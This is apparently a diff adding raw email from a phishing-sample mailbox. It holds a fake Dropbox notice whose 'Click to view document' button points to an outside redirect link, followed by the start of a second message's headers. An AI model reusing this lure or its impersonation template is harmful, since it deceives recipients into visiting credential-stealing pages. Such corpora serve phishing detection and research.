@@ -1,0 +1,86 @@
+From: "Mr Clark Holland" <admin@caronaz.cf>
+Date: Thu, 12 Apr 2018 02:48:48 +0200
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 463
+
+You will not see this in a MIME-aware mail reader.
+--===============0043062879==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+
+   =
+
+ =
+
+   =
+
+
+Hello jose@monkey.org,
+
+I just used dropbox to send you the invoice document!
+
+Click to view document
+Happy Dropboxing!
+ =20
+--===============0043062879==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><BODY><TABLE cellSpacing=3D0 width=3D"100%" border=
+=3D0>
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 0px" vAlign=3Dtop><IMG class=3D"m_16944111336924349=
+78m_-2876206716769504032gmail-CToWUd CToWUd" alt=3D"The Dropbox logo" src=
+=3D"https://ci3.googleusercontent.com/proxy/DV-CqODFnKnoG_sdOD2YHfv3RaX32hk=
+k_iyh5tZb6yQ-PJAuNF8dooB4Vc7JvVEkpK_Zo9pC5zSLEa_2nEAlkgPspNrI-blD6RAzwPvVI4=
+Az34h7Ez36v2yJYts=3Ds0-d-e1-ft#https://cf.dropboxstatic.com/static/images/e=
+mails/glyph/glyph%402x.png" width=3D40></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Open Sans",HelveticaNeue-Light,=
+"Helvetica Neue Light","Helvetica Neue",Helvetica,Arial,"Lucida Grande",san=
+s-serif; LINE-HEIGHT: 26px'>
+<TD><BR><BR>Hello jose@monkey.org,<BR><BR>I just used dropbox to send you t=
+he invoice document!<BR><BR><A style=3D'FONT-SIZE: 15px; MAX-WIDTH: 210px; =
+FONT-FAMILY: "Open Sans","Helvetica Neue",Arial; WIDTH: 210px; COLOR: white=
+; PADDING-BOTTOM: 14px; TEXT-ALIGN: center; PADDING-TOP: 14px; PADDING-LEFT=
+: 7px; MARGIN: 0px; DISPLAY: block; PADDING-RIGHT: 7px; BACKGROUND-COLOR: r=
+gb(0,126,230); border-radius: 4px; text-decoration-line: none' href=3D"http=
+://maioamarelo.org/redi.php" target=3D_blank data-saferedirecturl=3D"https:=
+//www.google.com/url?hl=3Den&amp;q=3Dhttp://bc.vc/bHp6fYe&amp;source=3Dgmai=
+l&amp;ust=3D1522347538491000&amp;usg=3DAFQjCNHq7czeuLU8ODkDsLaF6Q9_K1Q7Dg">=
+Click to view document</A><BR>Happy Dropboxing!</TD></TR>
+<TR>
+<TD height=3D40></TD></TR></TBODY></TABLE></TD></BODY></HTML>
+--===============0043062879==--
+
+From jose@monkey.org Sun Apr 15 20:32:13 2018 +0000
+Return-Path: admin@caronaz.cf
+Delivered-To: jose@monkey.org
+X-FDA: 74058583746.16.6605BE1
+Received: from filter.hostedemail.com (10.5.16.248.rfc1918.com [10.5.16.248])
+	by smtpin16.b.hostedemail.com (Postfix) with ESMTP id 2BCF62D2BC3
+	for <jose@monkey.org>; Sun, 15 Apr 2018 20:31:50 +0000 (UTC)
+X-Spam-Summary: 75,0,0,2ee19e3971dac277,d41d8cd98f00b204,admin@caronaz.cf,:,RULES_HIT:41:72:379:800:962:967:973:978:983:988:989:1189:1208:1221:1254:1260:1263:1313:1314:1381:1431:1432:1433:1434:1436:1437:1516:1517:1518:1533:1534:1541:1565:1571:1575:1588:1589:1592:1594:1711:1714:1719:1730:1748:1777:1792:2194:2198:2199:2200:2525:2560:2564:2682:2685:2771:2859:2933:2937:2939:2942:2945:2947:2951:2954:3022:3038:3138:3139:3140:3141:3142:3148:3245:3865:3867:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4321:5007:6261:6671:7652:8599:8603:8828:8957:8987:9025:9040:9059:9060:9416:9873:9908:9938:10004:10346:10400:10421:10482:11256:11257:11657:11658:11914:11958:12043:12438:12555:12903:12963:12986:13007:13071:13235:13236:13237:13374:13439:13857:14096:14180:14181:14195:14566:14655:14721:14849:18000:19900:19901:19997:19998:21080:21325:21347:21433:21436:21451:21524:21627:21731:21780:30026:30054:30055:30070:30083,0,RBL:80.211.177.163-irl.urbl.hostedemail.com-127.0.0.175,CacheIP:none,Bay
+ esian:0.
+X-HE-Tag: body20_2d17d9dbfac2e
+X-Filterd-Recvd-Size: 2934
+Received: from mail.caronaz.cf (unknown [80.211.177.163])
+	by imf25.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Sun, 15 Apr 2018 20:31:49 +0000 (UTC)
+Received: from [80.211.146.7] (unknown [80.211.146.7])
+	by mail.caronaz.cf (Postfix) with ESMTPA id EF3FEC6B11
+	for <jose@monkey.org>; Wed, 11 Apr 2018 18:19:42 -0400 (EDT)
+Content-Type: multipart/alternative; boundary="===============1591460649=="
+MIME-Version: 1.0
+Subject: I Just sent you a file via Dropbox...
+To: jose@monkey.org
